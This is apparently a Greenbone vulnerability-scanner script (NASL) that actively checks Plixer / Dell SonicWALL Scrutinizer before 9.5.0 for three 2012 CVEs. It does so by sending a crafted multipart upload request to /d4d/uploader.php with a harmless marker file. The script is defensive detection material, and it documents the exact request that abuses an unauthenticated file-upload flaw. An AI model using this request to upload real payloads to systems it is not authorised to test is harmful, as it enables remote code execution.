# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:dell:sonicwall_scrutinizer";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103528");
  script_version("2025-03-18T05:38:50+0000");
  script_cve_id("CVE-2012-2626", "CVE-2012-2627", "CVE-2012-3848");
  script_tag(name:"cvss_base", value:"9.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-03-18 05:38:50 +0000 (Tue, 18 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-08-02 10:24:13 +0200 (Thu, 02 Aug 2012)");
  script_name("Plixer / Dell SonicWALL Scrutinizer < 9.5.0 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("gb_plixer_dell_scrutinizer_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("plixer_dell/scrutinizer/http/detected");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210123202037/http://www.securityfocus.com/bid/54726");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210123202103/http://www.securityfocus.com/bid/54727");
  script_xref(name:"URL", value:"https://web.archive.org/web/20130827051639/https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt");

  script_tag(name:"summary", value:"Plixer / Dell SonicWALL Scrutinizer is prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.

  Note: This script checks for the presence of CVE-2012-2627 which indicates that the system is also
  affected by the other included CVEs.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2012-2626: A security bypass vulnerability.

  Successful attacks can allow an attacker to gain access to the affected application using the
  default authentication credentials.

  - CVE-2012-2627: A vulnerability that lets attackers upload arbitrary files. The issue occurs
  because the application fails to adequately sanitize user-supplied input.

  An attacker may leverage this issue to upload arbitrary files to the affected computer, this can
  result in arbitrary code execution within the context of the vulnerable application.

  - CVE-2012-3848: Multiple cross-site scripting (XSS) vulnerabilities.");

  script_tag(name:"affected", value:"Plixer / Dell SonicWALL Scrutinizer versions prior to 9.5.0.");

  script_tag(name:"solution", value:"Update to version 9.5.0 or later.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

useragent = http_get_user_agent();
host = http_host_name( port:port );
vtstrings = get_vt_strings();

file = vtstrings["lowercase_rand"] + ".txt";
len = 195 + strlen( file );

url = dir + "/d4d/uploader.php";

req = string("POST ", url, " HTTP/1.0\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: multipart/form-data; boundary=_Part_949_3365333252_3066945593\r\n",
             "Content-Length: ", len, "\r\n",
             "\r\n\r\n",
             "--_Part_949_3365333252_3066945593\r\n",
             "Content-Disposition: form-data;\r\n",
             'name="uploadedfile"; filename="', file, '"', "\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n",
             vtstrings["default"], "\r\n",
             "\r\n",
             "--_Part_949_3365333252_3066945593--\r\n\r\n");
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( '"success":1' >< res && file >< res ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
